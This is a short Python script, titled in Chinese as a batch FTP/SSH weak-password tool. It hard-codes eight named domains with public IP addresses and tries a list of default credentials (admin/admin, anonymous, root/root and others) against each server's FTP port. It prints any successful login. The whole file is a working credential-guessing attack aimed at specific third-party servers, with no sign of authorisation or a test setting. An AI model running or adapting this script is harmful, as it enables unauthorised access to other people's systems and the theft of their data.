#!/usr/bin/env python3
"""批量FTP/SSH弱口令"""
import socket, sys, subprocess, threading
from concurrent.futures import ThreadPoolExecutor

TARGETS = [
    ("zxpmq.com","121.198.236.198",21), ("ee1234.com","103.231.15.138",21),
    ("china-pcba.com","123.58.214.9",21), ("jingjiasc.com","110.42.101.58",21),
    ("nnwilking.com","43.138.203.5",21), ("baiousen.com","120.26.41.131",21),
    ("njrzkj.com","121.43.239.200",21), ("zgjsqw.com","103.148.58.62",21),
]

FTP_PWDS = [("admin","admin"),("admin","123456"),("admin","admin123"),("admin","888888"),
            ("ftp","ftp"),("test","test"),("anonymous",""),("admin",""),("root","root"),
            ("admin","12345678"),("www","www"),("user","user")]

def ftp_check(ip, port, user, pwd):
    try:
        s = socket.socket(); s.settimeout(6)
        s.connect((ip, port))
        banner = s.recv(200).decode("utf-8","ignore")
        s.send(f"USER {user}\r\n".encode())
        r1 = s.recv(200).decode("utf-8","ignore")
        if "331" in r1 or "230" in r1:
            s.send(f"PASS {pwd}\r\n".encode())
            r2 = s.recv(200).decode("utf-8","ignore")
            if "230" in r2:
                s.send(b"PWD\r\n")
                r3 = s.recv(200).decode("utf-8","ignore")
                print(f"!!! FTP HIT: {ip} {user}/{pwd} | PWD: {r3.strip()}", flush=True)
                s.close()
                return True
        s.close()
    except Exception:
        pass
    return False

def check_ftp(t):
    name, ip, port = t
    for user, pwd in FTP_PWDS:
        if ftp_check(ip, port, user, pwd):
            return f"{name}({ip}) {user}/{pwd}"
    return None

with ThreadPoolExecutor(10) as ex:
    for r in ex.map(check_ftp, TARGETS):
        if r: print(r, flush=True)

print("FTP DONE")
